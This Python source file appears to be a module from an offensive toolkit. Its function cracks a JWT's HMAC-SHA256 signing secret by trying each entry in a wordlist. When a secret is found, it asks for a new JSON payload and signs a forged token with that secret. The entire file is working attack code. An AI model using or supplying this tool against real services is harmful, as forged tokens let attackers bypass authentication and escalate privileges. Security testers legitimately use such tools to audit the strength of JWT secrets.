import sys
import os
sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from helpers import *

def bruteforce_and_forge():
    token = input(f"\n{YELLOW}[?] Enter Original JWT: {RESET}").strip()
    parts = token.split('.')
    if len(parts) != 3:
        print(f"{RED}[!] Error: Invalid JWT format.{RESET}")
        return

    while True:
        default_path = get_wordlist_path("secrets.txt")
        
        user_input = input(f"{YELLOW}[?] Enter wordlist path (Default: {default_path}): {RESET}").strip()
        
        wordlist_path = user_input if user_input else default_path
        
        if not os.path.exists(wordlist_path):
            print(f"{RED}[!] Error: Wordlist not found at {wordlist_path}{RESET}")
            retry = input(f"{YELLOW}[?] Try another wordlist? (Y/N): {RESET}").strip().upper()
            if retry in ['Y', 'YES', '']: continue
            else: break

        signing_input = f"{parts[0]}.{parts[1]}".encode()
        try:
            sig_b64 = parts[2]
            sig_b64 += "=" * ((4 - len(sig_b64) % 4) % 4)
            target_signature = base64.urlsafe_b64decode(sig_b64)
            
            print(f"{CYAN}[*] Cracking...{RESET}")
            start_time = time.time()
            found_secret = None
            
            with open(wordlist_path, 'r', encoding='utf-8', errors='ignore') as f:
                for line in f:
                    secret = line.strip()
                    if not secret: continue
                    attempt_sig = hmac.new(secret.encode(), signing_input, hashlib.sha256).digest()
                    if attempt_sig == target_signature:
                        found_secret = secret
                        break
            
            if found_secret:
                duration = round(time.time() - start_time, 2)
                print(f"\n{GREEN}[+] SECRET FOUND: {RESET}{RED}{found_secret}{RESET} ({duration}s)")
                
                choice = input(f"\n{YELLOW}[?] Do you want to forge a JWT? (Y/N): {RESET}").strip().upper()
                if choice in ['Y', 'YES', '']:
                    p_b64 = parts[1]
                    p_b64 += "=" * ((4 - len(p_b64) % 4) % 4)
                    print(f"{CYAN}[*] Original Payload: {RESET}{base64.urlsafe_b64decode(p_b64).decode()}")
                    new_payload_str = input(f'{YELLOW}[?] Enter NEW JSON Payload: {RESET}').strip()
                    new_p_b64 = b64_e(new_payload_str)
                    new_signing_input = f"{parts[0]}.{new_p_b64}".encode()
                    new_sig = hmac.new(found_secret.encode(), new_signing_input, hashlib.sha256).digest()
                    print(f"\n{GREEN}[+] FORGED JWT: {RED}{parts[0]}.{new_p_b64}.{b64_e(new_sig)}{RESET}")
                break 
            else:
                print(f"{RED}[-] Wordlist exhausted. Secret not found.{RESET}")
                retry = input(f"{YELLOW}[?] Try another wordlist? (Y/N): {RESET}").strip().upper()
                if retry not in ['Y', 'YES', '']: break

        except Exception as e:
            print(f"{RED}[!] Error: {e}{RESET}")
            break

    input(f"\n{CYAN}[>] Press Enter to return to menu...{RESET}")